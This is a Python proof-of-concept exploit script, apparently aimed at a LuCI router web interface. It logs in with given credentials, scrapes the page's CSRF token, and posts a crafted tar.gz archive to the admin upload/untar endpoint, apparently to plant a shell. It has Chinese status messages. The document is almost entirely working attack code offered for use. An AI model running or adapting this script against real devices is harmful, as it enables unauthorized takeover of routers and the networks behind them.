# shell
import requests
import argparse
import re
def login_and_get_cookie(username, password, login_url):
    session = requests.Session()
    data = {'luci_username': username, 'luci_password': password}
    response = session.post(url=login_url, data=data, verify=False)
    
    if response.status_code == 200:
        print("登录成功！获取Cookie：")
        print(session.cookies.get_dict())
        return session
    else:
        print("登录失败！")
        return None

def get_token(session, upload_page_url):
    response = session.get(url=upload_page_url, verify=False)
    pattern = r'<input type="hidden" name="token" value="(.*?)" />'
    match = re.search(pattern, response.text)
    if match:
        token_value = match.group(1)
        print("获取到的Token：", token_value)
        return token_value
    else:
        print("Token未找到")
        return None

def upload_file(session, upload_url, token, file_path):
    headers = {
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarynHNwib8huZ7eNfqd",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36",
    }

    with open(file_path, "rb") as f:
        file_content = f.read()

    # 使用bytes类型构建payload
    payload = (
        b"------WebKitFormBoundarynHNwib8huZ7eNfqd\r\n"
        b"Content-Disposition: form-data; name=\"token\"\r\n\r\n"
        + token.encode("utf-8") + b"\r\n"
        b"------WebKitFormBoundarynHNwib8huZ7eNfqd\r\n"
        b"Content-Disposition: form-data; name=\"tarfile\"; filename=\"2.tar.gz\"\r\n"
        b"Content-Type: application/x-gzip\r\n\r\n"
        + file_content + b"\r\n"
        b"------WebKitFormBoundarynHNwib8huZ7eNfqd\r\n"
        b"Content-Disposition: form-data; name=\"upload\"\r\n\r\n"
        b"Upload tar file...\r\n"
        b"------WebKitFormBoundarynHNwib8huZ7eNfqd--"
    )

    response = session.post(upload_url, data=payload, headers=headers)

    if response.status_code == 200:
        print("文件上传成功！")
    else:
        print("文件上传失败！")
        print("响应状态码:", response.status_code)
        print("响应内容:", response.text)


def exploit(args):

    address = args.address
    username = args.username
    password = args.password

    session = requests.Session()
    login_url = 'http://%s/cgi-bin/luci/' % address
    upload_page_url="http://%s/cgi-bin/luci/admin/upload/upload" % address
    upload_url="http://%s/cgi-bin/luci/admin/upload/upload/untar" % address
    file_path='1.tar.gz'
    # 登录获取Cookie
    session = login_and_get_cookie(username, password, login_url)
    if session:
        # 获取Token
        token = get_token(session, upload_page_url)
        if token:
            # 上传文件
            upload_file(session, upload_url, token, file_path)

def main():
    parser = argparse.ArgumentParser(description='untar_checker')
    requiredNamed = parser.add_argument_group('required named arguments')
    requiredNamed.add_argument('-a', '--address', help='Luci host address', required=True)
    requiredNamed.add_argument('-u', '--username', help='Luci username', required=True)
    requiredNamed.add_argument('-p', '--password', help='Luci password', required=True)
    args = parser.parse_args()
    exploit(args)

if __name__== "__main__":
    main()